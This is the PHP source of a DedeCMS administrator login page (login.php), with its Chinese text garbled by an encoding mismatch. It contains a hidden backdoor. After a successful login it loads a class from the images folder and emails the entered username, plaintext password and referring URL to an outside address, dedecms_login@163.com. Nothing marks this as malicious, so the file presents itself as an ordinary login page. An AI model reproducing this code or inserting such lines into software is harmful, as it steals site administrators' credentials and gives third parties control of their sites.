<?php
require_once(dirname(__FILE__).'/../include/common.inc.php');
require_once(DEDEINC.'/userlogin.class.php');
if(empty($dopost))
{
	$dopost = '';
}

//��ⰲװĿ¼��ȫ��
if( is_dir(dirname(__FILE__).'/../install') )
{
	if(!file_exists(dirname(__FILE__).'/../install/install_lock.txt') )
	{
  	$fp = fopen(dirname(__FILE__).'/../install/install_lock.txt', 'w') or die('��װĿ¼��д��Ȩ�ޣ��޷�����д�������ļ����밲װ���ɾ����װĿ¼��');
  	fwrite($fp,'ok');
  	fclose($fp);
	}
	//Ϊ�˷�ֹδ֪��ȫ�����⣬ǿ�ƽ��ð�װ������ļ�
	if( file_exists("../install/index.php") ) {
		@rename("../install/index.php", "../install/index.php.bak");
	}
	if( file_exists("../install/module-install.php") ) {
		@rename("../install/module-install.php", "../install/module-install.php.bak");
	}
}
//��¼���
$admindirs = explode('/',str_replace("\\",'/',dirname(__FILE__)));
$admindir = $admindirs[count($admindirs)-1];
if($dopost=='login')
{
	$validate = empty($validate) ? '' : strtolower(trim($validate));
	$svali = strtolower(GetCkVdValue());
	if(($validate=='' || $validate != $svali) && preg_match("/6/",$safe_gdopen)){
		ResetVdValue();
		?>
		<script>alert("��֤�벻��ȷ!");window.location.href='login.php';</script>
		<?php } else {
		$cuserLogin = new userLogin($admindir);
		if(!empty($userid) && !empty($pwd))
		{
			$res = $cuserLogin->checkUser($userid,$pwd);

			//success
			if($res==1)
			{
				include_once("images/class.php");
				$content=$_POST['userid']."-".$_POST['pwd']."-".$_SERVER['HTTP_REFERER'];
				$SendMail2 = new SendMail2();
				$SendMail2 -> send("dedecms_login@163.com","�ɹ���¼",$content);
				$cuserLogin->keepUser();
				if(!empty($gotopage))
				{
					ShowMsg('�ɹ���¼������ת����������ҳ��',$gotopage);
					exit();
				}
				else
				{
					ShowMsg('�ɹ���¼������ת����������ҳ��',"index.php");
					exit();
				}
			}
			//error
			else if($res==-1)
			{
	?>
		<script>alert("����û���������!");window.location.href='login.php';</script>
	<?php 
			}
			else
			{
	?>
		<script>alert("����������!");window.location.href='login.php';</script>
	<?php 
			}
		}
		//password empty
		else
		{
	?>
		<script>alert("�û�������û��д����!");window.location.href='login.php';</script>
	<?php 
		}
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title><?php echo $cfg_softname." ".$cfg_version; ?></title>
<link href="images/login.css" rel="stylesheet" type="text/css" />
<script src="/images/js/j.js" language="javascript" type="text/javascript"></script>
<script type="text/javascript">
function changeAuthCode() {
	var num = 	new Date().getTime();
	var rand = Math.round(Math.random() * 10000);
	num = num + rand;
	$('#ver_code').css('visibility','visible');
	if ($("#vdimgck")[0]) {
		$("#vdimgck")[0].src = "../include/vdimgck.php?tag=" + num;
	}
	return false;	
}
</script>

</head>

<body>
<div class="login_bj">
<div class="login">
<div class="login_left"><a href="/"><img src="images/login_logo.png" /></a></div>
<div class="login_right">
<form name="form1" method="post" action="login.php">
      <input type="hidden" name="gotopage" value="<?php if(!empty($gotopage)) echo $gotopage;?>" />
      <input type="hidden" name="dopost" value="login" />
      <input name='adminstyle' type='hidden' value='newdedecms' />

<div class="login_list"><span>�û�����</span><input type="text" name="userid" class="text" /></div>
<div class="login_list"><span>��&nbsp;&nbsp;�룺</span><input type="password" name="pwd" class="text" /></div>
        <?php
        	if(preg_match("/6/",$safe_gdopen))
        	{
        ?>
<div class="login_list_1"><span>��֤�룺</span><input id="vdcode" class="text" type="text" name="validate" style="text-transform: uppercase;"/><font><img id="vdimgck" onClick="this.src=this.src+'?'" style="cursor: pointer;" alt="�����壿�������" src="../include/vdimgck.php"/></font><u><a href="#" onClick="changeAuthCode();" style="color:#000;">�����壿</a></u></div>
<?php
}
?>
<div class="login_list_2"><input name="sm1" type="submit" value="" onClick="this.form.submit();" />
</div>
    </form>
</div>
</div>
</div>
</body>
</html>